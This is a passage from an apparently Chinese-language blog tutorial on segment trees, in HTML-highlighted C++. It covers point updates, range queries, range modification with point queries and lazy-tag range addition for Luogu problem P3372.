class="function"></span>&#123;</span><br><span class="line">tree[i].num += k;</span><br><span class="line"><span class="keyword">if</span> (tree[i].left == tree[i].right)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 修改左右儿子区间的值</span></span><br><span class="line"><span class="keyword">if</span> (dis &lt;= tree[i * <span class="number">2</span>].right)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">my_plus</span>(i * <span class="number">2</span>, dis, k);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (dis &gt;= tree[i * <span class="number">2</span> + <span class="number">1</span>].left)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">my_plus</span>(i * <span class="number">2</span> + <span class="number">1</span>, dis, k);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="区间查询"><a href="#区间查询" class="headerlink" title="区间查询"></a>区间查询</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查询[l, r]的状态，如 区间的和 或者 区间的最大值</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">search</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (l &lt;= tree[i].left &amp;&amp; tree[i].right &lt;= r)</span><br><span class="line">&#123;</span><br><span class="line">ans += tree[i].num;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (tree[i * <span class="number">2</span>].right &gt;= l)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">search</span>(i * <span class="number">2</span>, l, r);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (tree[i * <span class="number">2</span> + <span class="number">1</span>].left &lt;= r)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">search</span>(i * <span class="number">2</span> + <span class="number">1</span>, l, r);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="总代码"><a href="#总代码" class="headerlink" title="总代码"></a>总代码</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> nums[<span class="number">500010</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> left, right;</span><br><span class="line"><span class="type">int</span> num;</span><br><span class="line">&#125;tree[<span class="number">2000010</span>];  <span class="comment">// [4n]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> left, <span class="type">int</span> right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">tree[i].left = left;</span><br><span class="line">tree[i].right = right;</span><br><span class="line"><span class="comment">// 到叶子节点</span></span><br><span class="line"><span class="keyword">if</span> (left == right)<span class="keyword">return</span>;</span><br><span class="line"><span class="type">int</span> mid = left + (right - left) / <span class="number">2</span>;</span><br><span class="line"><span class="comment">// 递归构建左右子树</span></span><br><span class="line"><span class="built_in">build</span>(i * <span class="number">2</span>, left, mid);</span><br><span class="line"><span class="built_in">build</span>(i * <span class="number">2</span> + <span class="number">1</span>, mid + <span class="number">1</span>, right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (tree[i].left == tree[i].right)</span><br><span class="line">&#123;</span><br><span class="line">tree[i].num = nums[tree[i].right];</span><br><span class="line"><span class="keyword">return</span> tree[i].num;</span><br><span class="line">&#125;</span><br><span class="line">tree[i].num = <span class="built_in">add</span>(i * <span class="number">2</span>) + <span class="built_in">add</span>(i * <span class="number">2</span> + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> tree[i].num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 单点修改</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">my_plus</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> dis, <span class="type">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">tree[i].num += k;</span><br><span class="line"><span class="keyword">if</span> (tree[i].left == tree[i].right)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (dis &lt;= tree[i * <span class="number">2</span>].right)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">my_plus</span>(i * <span class="number">2</span>, dis, k);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (dis &gt;= tree[i * <span class="number">2</span> + <span class="number">1</span>].left)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">my_plus</span>(i * <span class="number">2</span> + <span class="number">1</span>, dis, k);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 区间查询</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">search</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (l &lt;= tree[i].left &amp;&amp; tree[i].right &lt;= r)</span><br><span class="line">&#123;</span><br><span class="line">ans += tree[i].num;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (tree[i * <span class="number">2</span>].right &gt;= l)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">search</span>(i * <span class="number">2</span>, l, r);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (tree[i * <span class="number">2</span> + <span class="number">1</span>].left &lt;= r)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">search</span>(i * <span class="number">2</span> + <span class="number">1</span>, l, r);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line">cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">&#123;</span><br><span class="line">cin &gt;&gt; nums[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">build</span>(<span class="number">1</span>, <span class="number">1</span>, n);</span><br><span class="line"><span class="built_in">add</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a, b, c;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">&#123;</span><br><span class="line">cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line"><span class="keyword">if</span> (a == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">my_plus</span>(<span class="number">1</span>, b, c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">ans = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">search</span>(<span class="number">1</span>, b, c);</span><br><span class="line">cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="线段树的构建"><a href="#线段树的构建" class="headerlink" title="线段树的构建"></a>线段树的构建</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> o, <span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    tree[o] = &#123; l, r, <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="comment">// 路径上记录的是区间修改值，叶子上记录的是节点权值</span></span><br><span class="line">    <span class="comment">// 将输入值赋值给线段树叶子节点，也就是说</span></span><br><span class="line">    <span class="comment">// 非叶子节点记录的只是区间修改值，所以query函数是加上路径上所有修改值和叶子节点的权值</span></span><br><span class="line">    <span class="keyword">if</span> (l == r)</span><br><span class="line">    &#123;</span><br><span class="line">        tree[o].num = nums[l];</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构建左右子树</span></span><br><span class="line">    <span class="type">int</span> m = l + (r - l) / <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">build</span>(o * <span class="number">2</span>, l, m);</span><br><span class="line">    <span class="built_in">build</span>(o * <span class="number">2</span> + <span class="number">1</span>, m + <span class="number">1</span>, r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="区间修改"><a href="#区间修改" class="headerlink" title="区间修改"></a>区间修改</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 区间修改</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">modify</span><span class="params">(<span class="type">int</span> o, <span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (tree[o].l &gt;= l &amp;&amp; tree[o].r &lt;= r)</span><br><span class="line">    &#123;</span><br><span class="line">        tree[o].num += k;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> m = (tree[o].l + tree[o].r) / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (l &lt;= m)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">modify</span>(o * <span class="number">2</span>, l, r, k);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (m &lt; r)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">modify</span>(o * <span class="number">2</span> + <span class="number">1</span>, l, r, k);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="单点查询"><a href="#单点查询" class="headerlink" title="单点查询"></a>单点查询</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 单点查询</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">query</span><span class="params">(<span class="type">int</span> o, <span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 将路径上的修改值，叶子上代表的原本的权值 全部加上就是最终的值</span></span><br><span class="line">    ans += tree[o].num;</span><br><span class="line">    <span class="keyword">if</span> (tree[o].l == tree[o].r)<span class="keyword">return</span>;</span><br><span class="line">    <span class="type">int</span> m = (tree[o].l + tree[o].r) / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (x &lt;= m)</span><br><span class="line">        <span class="built_in">query</span>(o &lt;&lt; <span class="number">1</span>, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">query</span>(o &lt;&lt; <span class="number">1</span> | <span class="number">1</span>, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="总代码-1"><a href="#总代码-1" class="headerlink" title="总代码"></a>总代码</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">5e5</span> + <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> nums[maxn];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">segment_tree</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> l, r;</span><br><span class="line"><span class="type">int</span> num;</span><br><span class="line">&#125;tree[maxn * <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> o, <span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">tree[o] = &#123; l, r, <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将输入值赋值给线段树叶子节点，也就是说</span></span><br><span class="line"><span class="comment">// 非叶子节点记录的只是区间修改值，所以query函数需要加上路径上所有值</span></span><br><span class="line"><span class="keyword">if</span> (l == r)</span><br><span class="line">&#123;</span><br><span class="line">tree[o].num = nums[l];</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构建左右子树</span></span><br><span class="line"><span class="type">int</span> m = l + (r - l) / <span class="number">2</span>;</span><br><span class="line"><span class="built_in">build</span>(o * <span class="number">2</span>, l, m);</span><br><span class="line"><span class="built_in">build</span>(o * <span class="number">2</span> + <span class="number">1</span>, m + <span class="number">1</span>, r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 区间修改</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">modify</span><span class="params">(<span class="type">int</span> o, <span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (tree[o].l &gt;= l &amp;&amp; tree[o].r &lt;= r)</span><br><span class="line">&#123;</span><br><span class="line">tree[o].num += k;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> m = (tree[o].l + tree[o].r) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (l &lt;= m)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">modify</span>(o * <span class="number">2</span>, l, r, k);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (m &lt; r)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">modify</span>(o * <span class="number">2</span> + <span class="number">1</span>, l, r, k);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 单点查询</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">query</span><span class="params">(<span class="type">int</span> o, <span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ans += tree[o].num;</span><br><span class="line"><span class="keyword">if</span> (tree[o].l == tree[o].r)<span class="keyword">return</span>;</span><br><span class="line"><span class="type">int</span> m = (tree[o].l + tree[o].r) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (x &lt;= m)</span><br><span class="line"><span class="built_in">query</span>(o &lt;&lt; <span class="number">1</span>, x);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">query</span>(o &lt;&lt; <span class="number">1</span> | <span class="number">1</span>, x);</span><br><span class="line">&#125;</span><br><span class="line">&#125;ST;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line">cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">&#123;</span><br><span class="line">cin &gt;&gt; nums[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ST.<span class="built_in">build</span>(<span class="number">1</span>, <span class="number">1</span>, n);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line">cin &gt;&gt; a;</span><br><span class="line"><span class="keyword">if</span> (a == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> x, y, z;</span><br><span class="line">cin &gt;&gt; x &gt;&gt; y &gt;&gt; z;</span><br><span class="line">ST.<span class="built_in">modify</span>(<span class="number">1</span>, x, y, z);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">ans = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line">cin &gt;&gt; x;</span><br><span class="line">ST.<span class="built_in">query</span>(<span class="number">1</span>, x);</span><br><span class="line">cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="进阶线段树（加法）"><a href="#进阶线段树（加法）" class="headerlink" title="进阶线段树（加法）"></a>进阶线段树（加法）</h2><p><a href="https://www.luogu.com.cn/problem/P3372">P3372 【模板】线段树 1 - 洛谷 | 计算机科学教育新生态 (luogu.com.cn)</a></p><h3 id="线段树的构建-1"><a href="#线段树的构建-1" class="headerlink" title="线段树的构建"></a>线段树的构建</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 节点</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span></span><br><span class="line">&#123;</span><br><span class="line">ll l, r, sum;</span><br><span class="line"><span class="comment">// lazytag</span></span><br><span class="line">ll lz;</span><br><span class="line">&#125;tree[N];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 线段树的构建</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(ll i, ll l, ll r, ll input[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 初始化节点</span></span><br><span class="line">tree[i].lz = <span class="number">0</span>;</span><br><span class="line">tree[i].l = l;</span><br><span class="line">tree[i].r = r;</span><br><span class="line"><span class="keyword">if</span> (l == r)</span><br><span class="line">&#123;</span><br><span class="line">tree[i].sum = input[l]; <span class="comment">// 将值输入给叶子节点</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">ll mid = l + (r - l) / <span class="number">2</span>;</span><br><span class="line"><span class="built_in">build</span>(<span class="number">2</span> * i, l, mid, input);</span><br><span class="line"><span class="built_in">build</span>(<span class="number">2</span> * i + <span class="number">1</span>, mid + <span class="number">1</span>, r, input);</span><br><span class="line"><span class="comment">// 最后返回时把上层节点赋值</span></span><br><span class="line">tree[i].sum = tree[<span class="number">2</span> * i].sum + tree[<span class="number">2</span> * i + <span class="number">1</span>].sum;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="push-down操作"><a href="#push-down操作" class="headerlink" title="push_down操作"></a>push_down操作</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">push_down</span><span class="params">(ll i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (tree[i].lz != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">// 将lazytag传给左右儿子</span></span><br><span class="line">tree[i * <span class="number">2</span>].lz += tree[i].lz;</span><br><span class="line">tree[i * <span class="number">2</span> + <span class="number">1</span>].lz += tree[i].lz;</span><br><span class="line">ll mid = (tree[i].l + tree[i].r) / <span class="number">2</span>;</span><br><span class="line"><span class="comment">// 这里儿子加的是父亲的lazytag，，因为本身的lazytag是使用过的，不需要再加</span></span><br><span class="line">tree[<span class="number">2</span> * i].sum += tree[i].lz * (mid - tree[i * <span class="number">2</span>].l + <span class="number">1</span>);</span><br><span class="line">tree[<span class="number">2</span> * i + <span class="number">1</span>].sum += tree[i].lz * (tree[i * <span class="number">2</span> + <span class="number">1</span>].r - mid);</span><br><span class="line">tree[i].lz = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="区间修改-1"><a href="#区间修改-1" class="headerlink" title="区间修改"></a>区间修改</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(ll i, ll l, ll r, ll k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 在范围内</span></span><br><span class="line"><span class="keyword">if</span> (tree[i].l &gt;= l &amp;&amp; tree[i].r &lt;= r)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">// 更新节点值并记录lazytag</span></span><br><span class="line">tree[i].sum += k * (tree[i].r - tree[i].l + <span class="number">1</span>);</span><br><span class="line">tree[i].lz += k;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span 